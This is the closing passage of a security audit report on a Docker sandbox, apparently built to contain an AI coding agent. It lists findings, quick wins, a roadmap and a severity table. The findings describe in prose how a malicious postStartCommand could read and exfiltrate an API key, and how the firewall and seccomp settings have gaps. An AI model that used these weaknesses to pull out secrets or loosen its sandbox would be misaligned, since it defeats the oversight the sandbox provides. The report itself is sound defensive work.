2. **HIGH — postStartCommand can exfiltrate secrets** (`lifecycle.go:397-408`): Runs after auth injection as the secret-reading user, with access to allowlisted domains (including `api.github.com`). A malicious `config.json` can read `/run/secrets/api_key` and exfiltrate it. This is inherent to the devcontainer trust model but worth documenting prominently. **Fix**: Consider running `postStartCommand` before secret injection, or document the trust boundary more prominently.

3. **HIGH — Rootless Docker silently breaks firewall**: `NET_ADMIN`/`NET_RAW` capabilities (`lifecycle.go:293`) are not available in rootless Docker. The firewall init fails (correctly fail-closed via `die()`), but the error message is a cryptic iptables error. **Fix**: Detect rootless Docker and provide a clear error message.

4. **HIGH — No integration tests for security-critical paths**: Firewall scripts, secret injection, container lifecycle, and managed-settings permissions are untested. These are the most important components to verify. **Fix**: Add a Docker-based integration test suite.

5. **MEDIUM — Feature re-download on every build**: OCI features are re-downloaded from registries on every image rebuild, adding 30-60 seconds. **Fix**: Cache features locally by OCI digest.

### 9.3 Top 5 Quick Wins

1. **Change `warn` to `die` for config parse and SeedSettings failures** — 2 lines in `run.go:270` and `run.go:456`. Prevents silent security degradation where sandbox runs without custom domains or managed-settings.json.

2. **Add first-run hint** — When no config file exists, print "No config found. Run `claude-bunker init` to customize." ~5 lines in `loadConfig()`.

3. **`chmod 444` managed-mcp.json after copy** — Add permission hardening at `plugins.go:169` to match `managed-settings.json` treatment. ~3 lines.

4. **Add verbose logging to silent error paths** — Add `log.Infof` calls in `extractMCPDomains`, `rewriteInstalledPlugins`, `walkPluginCacheMCPUncached` when errors occur. ~10 lines total.

5. **Detect rootless Docker** — Check for rootless mode in `NewClient()` or before `CreateAndStart()`, and provide a clear error: "claude-bunker requires Docker with NET_ADMIN capability (rootless Docker is not supported)". ~10 lines.

### 9.4 Refactoring Roadmap

No architectural refactoring is needed. The recommended improvements are additive:

**Phase 1 (Quick wins)**: Items 1-4 from Quick Wins above. Zero risk, immediate value.

**Phase 2 (Integration tests)**: Add `_integration/` test directory with Docker-based tests. Run in CI with Docker-in-Docker. Cover: firewall setup, secret visibility, managed-settings permissions, config parse error behavior.

**Phase 3 (Feature caching)**: Add local OCI feature cache at `~/.cache/claude-bunker/features/`. Key by image digest. Add `--no-feature-cache` flag for debugging.

**Phase 4 (Concurrent access)**: Add lockfile support via `flock` equivalent for Windows/Linux/macOS. Low priority since Docker serializes most operations.

### 9.5 Missing Capabilities

1. **`claude-bunker validate`** — Config validation without building
2. **`claude-bunker doctor`** — Full environment check (Docker version, disk space, network, config, rootless detection)
3. **Structured logging** — JSON log output for CI parsing (currently text-only)
4. **Container healthcheck** — Docker HEALTHCHECK instruction for monitoring
5. **`--dry-run` for rebuild** — Show what would change without building
6. **Rootless Docker detection** — Clear error when NET_ADMIN isn't available
7. **Podman compatibility testing** — Documented support status
8. **TTY guard on main command** — Check `isTTY()` before entering `runInSandbox()`, or gracefully handle `MakeRaw` failure in headless CI
9. **Feature digest pinning** — Allow config to pin OCI features by digest for supply-chain security
10. **`io_uring` in seccomp blocklist** — Block `io_uring_setup`/`io_uring_enter`/`io_uring_register` which have a history of container escape CVEs

---

## Appendix: Finding Count by Severity

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 0 | — |
| **HIGH** | 6 | Silent security failures (2), postStartCommand exfiltration, rootless Docker, no integration tests, firewall scripts untested |
| **MEDIUM** | 12 | Feature re-download, /24 subnet breadth, TOCTOU window, no config validator, headless TTY, concurrent access, plugin silent failures, error pattern inconsistency, build error context loss, HasOtherActiveSessions O(N), managed-mcp.json permissions, proxy credentials in env |
| **LOW** | 10 | No first-run hint, feature tag pinning, WSL2 detection, macOS consistency hint, no dry-run, lock file, MCP auth, io_uring seccomp, brief egress window, Podman untested |
| **INFO** | 14 | All passed/correctly-implemented items |

---

*End of audit report.*
